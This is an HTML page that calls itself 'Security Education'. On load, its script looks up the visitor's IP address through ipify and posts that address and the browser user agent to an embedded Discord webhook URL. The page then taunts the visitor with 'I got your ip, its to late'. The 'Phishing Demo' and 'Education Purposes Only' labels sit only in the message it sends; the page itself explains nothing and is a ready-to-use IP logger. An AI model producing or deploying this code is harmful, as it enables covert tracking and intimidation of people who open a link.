<html lang="en"><head>
    <meta charset="UTF-8">
    <title>Security Education</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a2e; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; border: 2px solid #e94560; padding: 40px; border-radius: 15px; background: #16213e; }
        h1 { color: #e94560; }
    </style>
</head>
<body>

    <div class="container">
        <h1>I got your ip, its to late</h1>
        <p>never trust anyone</p>
        <p id="status">Status: Data sent successfully.</p>
    </div>

    <script>
        async function logData() {
            // DOUBLE CHECK THIS URL:
            const webhookURL = "https://discord.com/api/webhooks/1499090765975130272/_YIcXBVdEL_H0m0tV1-6cm3lY4wI4-X_J2S0XDyjSm8PuC_jiGsvUPLErgBtwTk7YJW_";
            const statusEl = document.getElementById('status');

            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                const discordResponse = await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🎯 Phishing Demo: IP Logged",
                            color: 15158332,
                            fields: [
                                { name: "IP Address", value: `\`${ipData.ip}\``, inline: true },
                                { name: "Device Info", value: navigator.userAgent }
                            ],
                            footer: { text: "Education Purposes Only" },
                            timestamp: new Date()
                        }]
                    })
                });

                if (discordResponse.ok) {
                    statusEl.innerText = "Status: Data sent successfully. Check Discord!";
                } else {
                    statusEl.innerText = `Status: Error ${discordResponse.status}. Is the webhook URL correct?`;
                }

            } catch (err) {
                statusEl.innerText = "Status: Connection failed.";
                console.error(err);
            }
        }

        window.onload = logData;
    </script>

</body></html>
